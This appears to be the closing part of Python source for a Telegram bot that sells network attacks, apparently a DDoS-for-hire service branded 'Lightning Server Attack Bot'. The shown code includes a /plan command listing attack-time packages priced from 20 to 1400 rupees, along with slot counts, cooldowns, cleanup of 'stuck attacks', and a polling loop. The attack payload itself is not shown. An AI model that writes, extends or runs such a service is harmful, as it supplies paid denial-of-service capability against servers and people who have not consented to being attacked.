    bot.reply_to(message, f"🆔 Your ID: `{uid}`", parse_mode='Markdown')

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    response = """🌟 LIGHTNING SERVER PLANS:

💎 ULTIMATE PLAN:
→ Attack Time: 300 seconds
→ Priority Support
→ No Waiting Time

💰 PRICES (Users - Rs):
• 1 Hour:   20 Rs
• 1 Day:    150 Rs
• 2 Days:   300 Rs
• 1 Week:   600 Rs
• 15 Days:  750 Rs
• 1 Month:  1400 Rs

📩 Contact your respective seller"""
    bot.reply_to(message, response)

# ==================== MAIN ====================
def main():
    load_state()
    global allowed_user_ids
    allowed_user_ids = read_users()

    clean_expired_keys()
    clean_stuck_attacks()

    threading.Thread(target=start_health_server, daemon=True).start()
    threading.Thread(target=feedback_timeout_watcher, daemon=True).start()

    print("=" * 50)
    print("🔥 LIGHTNING SERVER ATTACK BOT STARTED!")
    print("=" * 50)
    print(f"👑 Owner: {OWNER_ID}")
    print(f"📊 Total Slots: {get_total_slots()}")
    print(f"⏱ Max Time: {get_max_time()}s")
    print(f"🕐 Cooldown: {get_cooldown()}s")
    print(f"🔒 API Key: {'SET' if _get_api_key() else 'NOT SET'}")
    print(f"📸 Feedback Channel: {get_feedback_channel() or 'NOT SET'}")
    print(f"⏱ Feedback Window: 2 min → else 10 min cooldown")
    print("=" * 50)
    print("✅ Bot is running...")
    print("=" * 50)

    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=60)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()